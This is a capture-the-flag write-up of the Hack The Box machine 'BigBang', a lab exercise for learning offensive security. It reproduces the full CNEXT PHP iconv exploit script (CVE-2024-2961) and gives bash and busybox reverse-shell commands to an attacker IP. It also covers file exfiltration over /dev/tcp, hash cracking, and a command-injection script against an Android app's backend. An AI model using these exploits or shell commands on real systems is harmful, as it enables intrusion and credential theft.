+++
title = "HTB - BigBang"
date = "2025-04-26"
author = "Brainmoustache"
authorTwitter = "Brainmoustache"
cover = ""
tags = ["iconv", "php-filter-chain", "grafana", "android", "reverse-apk"]
keywords = ["hacking", "htb", "bigbang", "hack the box"]
description = "Write-up of Hack The Box hard machine BigBang"
showFullContent = false
readingTime = true
hideComments = false
color = "blue"
+++

# HTB - BigBang

## Enumeration:
Nmap
```bash
Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.036KB)
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-30 08:03 EST
Nmap scan report for 10.129.231.253
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
|_  256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds
```

## User exploit
Looking at the nmap output, we identified a new subdomain `blog.bigbang.htb`.

Adding it into `/etc/hosts`

![](/img/htb/bigbang/webapplication_wordpress.png)

The web application is a Wordpress. 
You can validate by looking at the copyright at the bottom. 

There is a form available to send comment on the page. Underneath, you see a mention 

> Proudly brought to you by BuddyForms

![](/img/htb/bigbang/webapplication_buddyforms.png)


If you look at the HTTP request exchange when submitting the form, you can see this one:

`http://blog.bigbang.htb/wp-content/plugins/buddyforms/assets/js/buddyforms.js?ver=6.5.4`

Searching online for vulnerability about `buddyforms`, we find the [CVE-2023-26326](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8).

You can also find the vulnerable plugin with `wpscan`

`wpscan --url http://blog.bigbang.htb --enumerate --api-token [REDACTED] --plugins-detection mixed`

First POC is done by testing with the following example.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: blog.bigbang.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://blog.bigbang.htb/
Priority: u=2
Content-type: application/x-www-form-urlencoded
Content-Length: 74

action=upload_image_from_url&url=http://10.10.14.6/image&id=1&accepted_files=image/gif
```

On our website, `image` is actually a file with `GIF89a` (mime type of GIF) at the beginning. `echo "GIF89aBrainmyman" > image`

You will be able to confirm that the file actually was fetched by the web application with the response and the content of the file while retrieving it. 

Response from the previous request
```http
HTTP/1.1 200 OK
Date: Sun, 04 May 2025 16:02:47 GMT
Server: Apache/2.4.62 (Debian)
X-Powered-By: PHP/8.3.2
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Content-Length: 112
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/05\/1.png","attachment_id":155}
```

Looking at the content
```http
GET //wp-content//uploads//2025//05//1.png HTTP/1.1
Host: blog.bigbang.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```http
HTTP/1.1 200 OK
Date: Sun, 04 May 2025 16:04:00 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Sun, 04 May 2025 16:02:48 GMT
ETag: "11-6345183c69ddd"
Accept-Ranges: bytes
Content-Length: 17
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/png

GIF89aBrainmyman
```

This is not enough to get RCE. We need to find a way to get RCE.
Searching online, you'll eventually find another blog post talking about another bug related to this exploit.

[CVE-2024-2961](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html)

> The iconv() function in the GNU C Library versions 2.39 and older may overflow the output buffer passed to it by up to 4 bytes when converting strings to the ISO-2022-CN-EXT character set, which may be used to crash an application or overwrite a neighbouring variable. [https://nvd.nist.gov/vuln/detail/cve-2024-2961](https://nvd.nist.gov/vuln/detail/cve-2024-2961)

https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py

Using PHP gadget filter chain and the previous POC, you will end up with this script:

```python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *

import urllib.parse

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()
        self.session.proxies = {"http":"http://127.0.0.1:8080"}

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        GIF_CHAIN = "php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource="
        data = {
            "action":"upload_image_from_url", 
            "url": urllib.parse.quote_plus(GIF_CHAIN + path), 
            "id":1, 
            "accepted_files":"image/gif"
        }

        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        response = self.send(path)
        url = response.json()["response"]
        if not url.startswith("http"):
            print(url)
            raise ValueError("Invalid URL")
        data = self.session.get(url).content
        return data[6:]

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            if result in text.encode():
                return True
            return False

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if result not in text:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        # text = tf.random.string(50)
        # base64 = b64(compress(text.encode()), misalign=True).decode()
        # path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        # if not check_token(text, path):
        #     failure("The [i]zlib[/] extension is not enabled")

        # msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        # Add nullbyte
        with open(LIBC_FILE, "ab") as f:
            f.write(b"\0"*16)


        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        print(heaps)
        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:    

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
```
The chain is created with [wrapwrap]()
`python3 wrapwrap.py '/etc/passwd' 'GIF89a' '' 0`

Here is the full command to run the payload and get RCE `python3 cnext-exploit.py http://blog.bigbang.htb/wp-admin/admin-ajax.php "bash -c '/bin/bash -i >& /dev/tcp/10.10.14.6/7001 0>&1'"`

Now we are in a container. Get the information about the database.

`www-data@8e3a72b5e980:/var/www/html/wordpress$ cat wp-config.php `

```bash
# Content of wp-config.php file

/** Database username */
define( 'DB_USER', 'wp_user' );                                                              

/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
                                                                                             
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' ); 
```
There is no mysql client on the container so we have to forward port to localhost to be able to search the DB.
Using `chisel`, we can do so.

```bash
# Attacker machine
./chisel server --reverse -p 7001

# Compromised machine
./chisel client 10.10.14.6:7001 R:3306:172.17.0.1:3306
```
Using mysql, we can log into the mysql database

`mysql -u wp_user -h 127.0.0.1 -p `

Extract the content from `wp_users`.

```bash
# Command
use wordpress;

select user_pass,user_email,user_login from wp_users;

# Output
+------------------------------------+----------------------+------------+
| user_pass                          | user_email           | user_login |
+------------------------------------+----------------------+------------+
| $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 | root@bigbang.htb     | root       |
| $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./ | shawking@bigbang.htb | shawking   |
+------------------------------------+----------------------+------------+
```

Crack the hash password of `shawking` with hashcat.

```bash
# Command
hashcat.exe -m 400 hashes.txt wordlists/rockyou.txt

# Output
$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics
```

Log into the machine and get the flag
```bash
sshpass -p 'quantumphysics' ssh shawking@bigbang.htb

cat /home/shawking/user.txt
```

## Root exploit
Looking around, we find a `grafana.db` in the `/opt/data/` folder
```bash
shawking@bigbang:~$ ls -al /opt/data
total 1008
drwxr-xr-x 6 root root    4096 Apr 29 23:29 .
drwxr-xr-x 4 root root    4096 Jun  5  2024 ..
drwxr--r-- 2 root root    4096 Jun  5  2024 csv
-rw-r--r-- 1 root root 1003520 Apr 29 23:29 grafana.db
drwxr--r-- 2 root root    4096 Jun  5  2024 pdf
drwxr-xr-x 2 root root    4096 Jun  5  2024 plugins
drwxr--r-- 2 root root    4096 Jun  5  2024 png
```
Using [`grafana2hashcat`](https://github.com/iamaldi/grafana2hashcat), we get put the db into a format crackable by `hashcat`

The argument `hashes` needed to use `grafana2hashcat` is configured this way
> hashes      Input file holding the Grafana hashes in the 'hash,salt' format.

We can dump the content of the `user` table to gather the hash and the salt.

```bash
# Command
sqlite3 grafana.db ".dump user"

# Output
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE `user` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `version` INTEGER NOT NULL
, `login` TEXT NOT NULL
, `email` TEXT NOT NULL
, `name` TEXT NULL
, `password` TEXT NULL
, `salt` TEXT NULL
, `rands` TEXT NULL
, `company` TEXT NULL
, `org_id` INTEGER NOT NULL
, `is_admin` INTEGER NOT NULL
, `email_verified` INTEGER NULL
, `theme` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0, is_service_account BOOLEAN DEFAULT 0, `uid` TEXT NULL);
INSERT INTO user VALUES(1,0,'admin','admin@localhost','','441a715bd788e928170be7954b17cb19de835a2dedfdece8c65327cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34','CFn7zMsQpf','CgJll8Bmss','',1,1,0,'','2024-06-05 16:14:51','2024-06-05 16:16:02',0,'2024-06-05 16:16:02',0,0,'');
INSERT INTO user VALUES(2,0,'developer','ghubble@bigbang.htb','George Hubble','7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960','4umebBJucv','0Whk1JNfa3','',1,0,0,'','2024-06-05 16:17:32','2025-01-20 16:27:39',0,'2025-01-20 16:27:19',0,0,'ednvnl5nqhse8d');
COMMIT;
```

The hashes-grafana file looks like this
```bash
7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960,4umebBJucv
```
Using the tool to put it into hashcat format
```bash
# Command
python3 grafana2hashcat.py -o hashes hashes-grafana

# Output
sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=
```
Using `hashcat` with mode `10900`, we can crack the password of user `developer`
```bash
# Command
hashcat.exe -m 10900 hashes.txt wordlists/rockyou.txt

# Output
sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=:bigbang
```
`sshpass -p bigbang ssh developer@bigbang.htb`

There is a specific folder on the home directory `android`.

You can find an apk inside `satellite-app.apk`. 

Download the file into your box and open it using [jadx](https://github.com/skylot/jadx)

```bash
# Victim machine
cat satellite-app.apk > /dev/tcp/10.10.14.6/7001

# Attacker machine
nc -lvnp 7001 > satellite-app.apk

# Open the apk
jadx-gui [Enter]
satellite-app.apk 
```
Searching with term `bigbang.htb`, you find a new domain in the `u.AsyncTaskC0228f` class.

`app.bigbang.htb:9090`

You can validate it's actually running by looking at the port on the box. You can also forward it and test it using `curl`

```bash
developer@bigbang:~/android$ ss -laputen | grep 9090

tcp   LISTEN 0      128        127.0.0.1:9090       0.0.0.0:*     ino:37248 sk:8 cgroup:/system.slice/satellite.service <-> 
```

```bash
# SSH Local forward
sshpass -p bigbang ssh -L :9090:127.0.0.1:9090 developer@blog.bigbang.htb

# Testing the endpoint
curl -XPOST http://127.0.0.1:9090/login --json "{}"

{"error":"Missing username or password"}
```

We could find more information about the `/login` endpoint. We see it wants a `username` and `password`.
```java
try {
        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/login").openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Content-Type", "application/json");
        httpURLConnection.setRequestProperty("Accept", "application/json");
        httpURLConnection.setDoOutput(true);
        outputStream = httpURLConnection.getOutputStream();
[...]
```
Looking more into the code, we can see that the application is indeed waiting for a username and password
```java
if (obj2.isEmpty() || obj3.isEmpty()) {
        Toast.makeText(loginActivity, "Please enter username and password", 0).show();
        break;
} else {
        try {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("username", obj2);
        jSONObject.put("password", obj3);
        new AsyncTaskC0228f((LoginActivity) obj, 1).execute(jSONObject.toString());
        break;
        } catch (Exception e2) {
        e2.printStackTrace();
        return;
        }
}
```
Moreover, there is a second function located inside `package q0`.
```java
public final class b extends AsyncTask {

    /* renamed from: a, reason: collision with root package name */
    public String f3686a;

    /* renamed from: b, reason: collision with root package name */
    public final /* synthetic */ TakePictureActivity f3687b;

    public b(TakePictureActivity takePictureActivity) {
        this.f3687b = takePictureActivity;
    }

    @Override // android.os.AsyncTask
    public final Object doInBackground(Object[] objArr) {
        this.f3686a = ((String[]) objArr)[0];
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/command").openConnection();
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setRequestProperty("Authorization", "Bearer " + this.f3687b.f2003p);
            httpURLConnection.setDoOutput(true);
            String str = "{\"command\": \"send_image\", \"output_file\": \"" + this.f3686a + "\"}";
            OutputStream outputStream = httpURLConnection.getOutputStream();
            try {
                byte[] bytes = str.getBytes("utf-8");
                outputStream.write(bytes, 0, bytes.length);
                outputStream.close();
                if (httpURLConnection.getResponseCode() != 200) {
                    return Boolean.FALSE;
                }
                InputStream inputStream = httpURLConnection.getInputStream();
                FileOutputStream fileOutputStream = new FileOutputStream(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), this.f3686a));
                try {
                    byte[] bArr = new byte[1024];
                    while (true) {
                        int read = inputStream.read(bArr);
                        if (read == -1) {
                            fileOutputStream.close();
                            inputStream.close();
                            return Boolean.TRUE;
                        }
                        fileOutputStream.write(bArr, 0, read);
                    }
                } finally {
                }
            } finally {
            }
        } catch (Exception e2) {
            e2.printStackTrace();
            return Boolean.FALSE;
        }
    }

    @Override // android.os.AsyncTask
    public final void onPostExecute(Object obj) {
        boolean booleanValue = ((Boolean) obj).booleanValue();
        TakePictureActivity takePictureActivity = this.f3687b;
        if (booleanValue) {
            Toast.makeText(takePictureActivity, "Request Successful and Image Downloaded", 0).show();
        } else {
            Toast.makeText(takePictureActivity, "Request Failed", 0).show();
        }
    }
}
```
This function needs a valid `Bearer`, which could be obtained by login into the application.

We can also spot the vulnerability here. It's in the parameter `output_file`. We could see the parameter is populate using the content of the request. 

The function `FileOutputStream fileOutputStream = new FileOutputStream(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), this.f3686a));` also take the variable without any filtering. 

The following script automate the process of login into the application and send a malicious request to get remote code execution.

```python
# android_exploit.py
import requests

# Authenticate to the android application
headers = {"Content-type":"application/json"}
data = {"username":"developer", "password":"bigbang"}
response = requests.post("http://127.0.0.1:9090/login", headers=headers, json=data)
access_token = response.json()['access_token']

# Using the access token the send malicious payload
headers = {"Content-type":"application/json", "Authorization":f"Bearer {access_token}"}
exploit_command = '/tmp/random \n busybox nc 10.10.14.6 7001 -e sh'
data = {"command":"send_image", "output_file":f"{exploit_command}"}

response = requests.post("http://127.0.0.1:9090/command", headers=headers, json=data)
```
Get the shell
```bash
nc -lvnp 7001

cat /root/root.txt
```

## Resources:

| Hyperlink                                                                                                                            | Info                               |
| ------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------- |
| https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8 | CVE-2023-26326                     |
